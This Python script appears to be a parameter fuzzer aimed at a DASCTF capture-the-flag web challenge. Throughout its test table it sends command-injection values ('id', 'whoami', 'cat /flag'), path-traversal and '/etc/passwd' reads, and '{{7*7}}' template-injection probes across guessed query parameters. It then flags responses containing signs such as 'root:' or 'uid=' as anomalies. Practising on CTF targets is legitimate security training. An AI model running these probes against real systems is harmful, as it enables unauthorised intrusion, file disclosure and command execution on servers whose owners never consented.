#!/usr/bin/env python3
import hashlib
import json
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://2273095efcf1270253338a5c.http-ctf2.dasctf.com/"
TESTS = {
    "_branch006_control": ["", "1", "true", "flag"],
    "source": ["", "1", "true", "index", "/etc/passwd"],
    "debug": ["", "1", "true", "yes", "on"],
    "flag": ["", "1", "true", "flag", "/flag"],
    "cmd": ["", "id", "whoami", "cat /flag", "echo branch006"],
    "file": ["", "flag", "/flag", "/etc/passwd", "../../flag"],
    "read": ["", "1", "flag", "/flag", "/etc/passwd"],
    "path": ["", "/", "flag", "/flag", "/etc/passwd"],
    "action": ["", "show", "view", "read", "source"],
    "id": ["", "0", "1", "-1", "flag"],
    "page": ["", "0", "1", "index", "flag"],
    "code": ["", "1", "source", "flag", "{{7*7}}"],
    "show": ["", "1", "true", "source", "flag"],
    "view": ["", "1", "source", "index", "flag"],
    "template": ["", "index", "flag", "{{7*7}}", "../flag"],
}
KEYWORDS = [
    "flag{", "ctf{", "root:", "uid=", "werkzeug", "traceback",
    "exception", "error", "49", "source code", "branch006",
]


def fetch(params):
    query = urllib.parse.urlencode(params)
    url = BASE + ("?" + query if query else "")
    req = urllib.request.Request(
        url,
        headers={"User-Agent": "branch006-param-diff/1.0", "Accept": "*/*"},
    )
    started = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=12) as resp:
            body = resp.read()
            status = resp.status
            headers = dict(resp.headers.items())
            final_url = resp.geturl()
    except urllib.error.HTTPError as exc:
        body = exc.read()
        status = exc.code
        headers = dict(exc.headers.items())
        final_url = exc.geturl()
    elapsed = round(time.monotonic() - started, 3)
    text = body.decode("utf-8", "replace").lower()
    return {
        "params": params,
        "url": url,
        "status": status,
        "length": len(body),
        "sha256": hashlib.sha256(body).hexdigest(),
        "content_type": headers.get("Content-Type", ""),
        "location": headers.get("Location", ""),
        "final_url": final_url,
        "elapsed": elapsed,
        "keywords": [word for word in KEYWORDS if word in text],
        "preview": text[:160].replace("\n", " "),
    }


baseline = fetch({})
rows = []
for name, values in TESTS.items():
    for value in values:
        try:
            row = fetch({name: value})
        except Exception as exc:
            row = {"params": {name: value}, "error": repr(exc)}
        rows.append(row)
        print(json.dumps(row, ensure_ascii=False), flush=True)

with open("/tmp/branch006_param_diff.jsonl", "w", encoding="utf-8") as handle:
    handle.write(json.dumps({"baseline": baseline}, ensure_ascii=False) + "\n")
    for row in rows:
        handle.write(json.dumps(row, ensure_ascii=False) + "\n")

print("BASELINE", json.dumps(baseline, ensure_ascii=False))
anomalies = [
    row for row in rows
    if "error" in row
    or (row["status"], row["length"], row["sha256"])
       != (baseline["status"], baseline["length"], baseline["sha256"])
    or row["keywords"]
]
print("ANOMALY_COUNT", len(anomalies))
for row in anomalies:
    print("ANOMALY", json.dumps(row, ensure_ascii=False))
